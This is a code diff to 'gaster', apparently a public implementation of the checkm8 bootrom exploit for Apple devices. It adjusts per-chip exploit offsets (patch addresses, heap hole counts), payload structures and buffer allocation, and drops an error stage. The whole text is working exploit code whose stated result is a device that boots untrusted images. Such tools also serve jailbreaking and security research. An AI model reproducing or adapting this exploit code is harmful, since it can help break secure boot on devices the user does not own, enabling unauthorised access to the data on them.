@@ -205,8 +205,7 @@ static enum {
 	STAGE_SPRAY,
 	STAGE_SETUP,
 	STAGE_PATCH,
-	STAGE_PWNED,
-	STAGE_ERROR
+	STAGE_PWNED
 } stage;
 static uint16_t cpid;
 static bool manual_reset;
@@ -545,8 +544,8 @@ static bool
 reset_usb_handle(usb_handle_t *handle) {
 	UInt64 session_id;
 
-	if(manual_reset) {
-		if((stage == STAGE_SETUP || stage == STAGE_PATCH) && (cpid == 0x8960 || cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011) && get_usb_session_id(handle, &session_id) && IOObjectRetain(handle->serv) == kIOReturnSuccess) {
+	if(manual_reset && (stage == STAGE_SETUP || stage == STAGE_PATCH) && (cpid == 0x8960 || cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011)) {
+		if(get_usb_session_id(handle, &session_id) && IOObjectRetain(handle->serv) == kIOReturnSuccess) {
 			close_usb_handle(handle);
 			puts("Please disconnect and reconnect the lightning cable now.");
 			return wait_usb_handle(handle, 0, 0, manual_reset_check_usb_device, &session_id);
@@ -714,7 +713,7 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			cpid = 0x8950;
 			config_large_leak = 659;
 			config_overwrite_pad = 0x640;
-			patch_addr = 0x4D28;
+			patch_addr = 0x3F004D28;
 			memcpy_addr = 0x9ACC;
 			aes_crypto_cmd = 0x7301;
 			gUSBSerialNumber = 0x10061F80;
@@ -729,7 +728,7 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			cpid = 0x8955;
 			config_large_leak = 659;
 			config_overwrite_pad = 0x640;
-			patch_addr = 0x4D28;
+			patch_addr = 0x3F004D28;
 			memcpy_addr = 0x9B0C;
 			aes_crypto_cmd = 0x7341;
 			gUSBSerialNumber = 0x10061F80;
@@ -744,7 +743,7 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			cpid = 0x8947;
 			config_large_leak = 626;
 			config_overwrite_pad = 0x660;
-			patch_addr = 0x4950;
+			patch_addr = 0x3F004950;
 			memcpy_addr = 0x9A3C;
 			aes_crypto_cmd = 0x7061;
 			gUSBSerialNumber = 0x3402DDF8;
@@ -804,9 +803,9 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			usb_serial_number_string_descriptor = 0x18008062A;
 		} else if(strstr(usb_serial_num, " SRTG:[iBoot-2098.0.0.2.4]") != NULL) {
 			cpid = 0x7002;
-			config_hole = 14;
+			config_hole = 16;
 			config_overwrite_pad = 0x300;
-			patch_addr = 0x3DEC;
+			patch_addr = 0x40003DEC;
 			memcpy_addr = 0x89F4;
 			aes_crypto_cmd = 0x6341;
 			gUSBSerialNumber = 0x46005958;
@@ -882,7 +881,7 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			cpid = 0x8002;
 			config_hole = 5;
 			config_overwrite_pad = 0x5C0;
-			patch_addr = 0x4452;
+			patch_addr = 0x40004452;
 			memcpy_addr = 0xB6F8;
 			aes_crypto_cmd = 0x86DD;
 			gUSBSerialNumber = 0x48802AB8;
@@ -897,7 +896,7 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			cpid = 0x8004;
 			config_hole = 5;
 			config_overwrite_pad = 0x5C0;
-			patch_addr = 0x4452;
+			patch_addr = 0x40004452;
 			memcpy_addr = 0xA884;
 			aes_crypto_cmd = 0x786D;
 			gUSBSerialNumber = 0x48802AE8;
@@ -1247,14 +1246,14 @@ read_binary_file(const char *filename, uint8_t **buf, size_t *len) {
 static bool
 checkm8_stage_patch(const usb_handle_t *handle) {
 	struct {
+		uint64_t pwnd[2], payload_dest, dfu_handle_request, payload_off, payload_sz, memcpy_addr, gUSBSerialNumber, usb_create_string_descriptor, usb_serial_number_string_descriptor, ttbr0_vrom_addr, patch_addr;
+	} A9;
+	struct {
 		uint64_t pwnd[2], payload_dest, dfu_handle_request, payload_off, payload_sz, memcpy_addr, gUSBSerialNumber, usb_create_string_descriptor, usb_serial_number_string_descriptor, patch_addr;
 	} notA9;
 	struct {
 		uint32_t pwnd[4], payload_dest, dfu_handle_request, payload_off, payload_sz, memcpy_addr, gUSBSerialNumber, usb_create_string_descriptor, usb_serial_number_string_descriptor, patch_addr;
 	} notA9_armv7;
-	struct {
-		uint64_t pwnd[2], payload_dest, dfu_handle_request, payload_off, payload_sz, memcpy_addr, gUSBSerialNumber, usb_create_string_descriptor, usb_serial_number_string_descriptor, ttbr0_vrom_addr, patch_addr;
-	} A9;
 	struct {
 		uint64_t handle_interface_request, insecure_memory_base, exec_magic, done_magic, usb_core_do_transfer;
 	} handle_checkm8_request;
@@ -1309,7 +1308,13 @@ checkm8_stage_patch(const usb_handle_t *handle) {
 			if(payload_handle_checkm8_request_bin_len > sizeof(handle_checkm8_request)) {
 				payload_handle_checkm8_request = payload_handle_checkm8_request_bin;
 				payload_handle_checkm8_request_sz = payload_handle_checkm8_request_bin_len - sizeof(handle_checkm8_request);
-				data = calloc(1, DFU_MAX_TRANSFER_SZ + payload_sz + sizeof(A9) + payload_handle_checkm8_request_sz + sizeof(handle_checkm8_request));
+				if(cpid == 0x8000 || cpid == 0x8003) {
+					data = calloc(1, payload_sz + sizeof(A9) + payload_handle_checkm8_request_sz + sizeof(handle_checkm8_request));
+				} else if(cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8012 || cpid == 0x8015) {
+					data = calloc(1, DFU_MAX_TRANSFER_SZ + payload_sz + sizeof(notA9) + payload_handle_checkm8_request_sz + sizeof(handle_checkm8_request));
+				} else {
+					data = calloc(1, payload_sz + sizeof(notA9) + payload_handle_checkm8_request_sz + sizeof(handle_checkm8_request));
+				}
 			} else {
 				payload_handle_checkm8_request = NULL;
 				payload_handle_checkm8_request_sz = 0;
@@ -1484,9 +1489,6 @@ checkm8_stage_patch(const usb_handle_t *handle) {
 			free(data);
 		}
 	}
-	if(!ret) {
-		stage = STAGE_ERROR;
-	}
 	return ret;
 }
 
@@ -1495,7 +1497,7 @@ gaster_checkm8(usb_handle_t *handle) {
 	bool ret, pwned;
 
 	init_usb_handle(handle, APPLE_VID, DFU_MODE_PID);
-	while(stage != STAGE_PWNED && stage != STAGE_ERROR && wait_usb_handle(handle, 0, 0, checkm8_check_usb_device, &pwned)) {
+	while(stage != STAGE_PWNED && wait_usb_handle(handle, 0, 0, checkm8_check_usb_device, &pwned)) {
 		if(!pwned) {
 			if(stage == STAGE_RESET) {
 				puts("Stage: RESET");
@@ -1517,19 +1519,15 @@ gaster_checkm8(usb_handle_t *handle) {
 				puts("Stage: PATCH");
 				ret = checkm8_stage_patch(handle);
 			}
-			if(stage != STAGE_ERROR) {
-				if(ret) {
-					puts("ret: true");
-				} else {
-					puts("ret: false");
-					if(stage != STAGE_PATCH) {
-						stage = STAGE_RESET;
-					}
-				}
-				reset_usb_handle(handle);
+			if(ret) {
+				puts("ret: true");
 			} else {
-				puts("Exploit failed.");
+				puts("ret: false");
+				if(stage != STAGE_PATCH) {
+					stage = STAGE_RESET;
+				}
 			}
+			reset_usb_handle(handle);
 		} else {
 			stage = STAGE_PWNED;
 			puts("Now you can boot untrusted images.");
